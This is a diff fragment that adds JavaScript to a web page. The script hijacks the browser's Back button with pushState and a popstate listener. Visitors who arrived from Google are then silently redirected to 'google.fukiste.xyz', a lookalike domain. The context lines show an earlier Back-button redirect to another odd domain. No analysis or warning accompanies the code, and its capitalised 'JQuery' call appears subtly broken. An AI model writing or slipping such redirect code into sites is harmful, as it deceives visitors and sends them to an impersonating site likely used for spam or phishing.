@@ -4,3 +4,22 @@ bajb_backdetect.OnBack = function(){
     document.location.href = 'http://WATCHEUE-YYS-HSOI-29.com'; 
 }
 // ]]></script>
+<script>
+JQuery(document).ready(function($) {
+  if (window.history && window.history.pushState) 
+  {
+    window.history.pushState('forward', null, './');
+    $(window).on('popstate', function() 
+    {
+      var ref = document.referrer;
+      if (ref!='')
+      {
+        if (ref.match(".*?\\bgoogle\\b.*?")) 
+        {
+          window.location.href = 'http://google.fukiste.xyz';
+        }
+      }
+    });
+  }
+});
+</script>
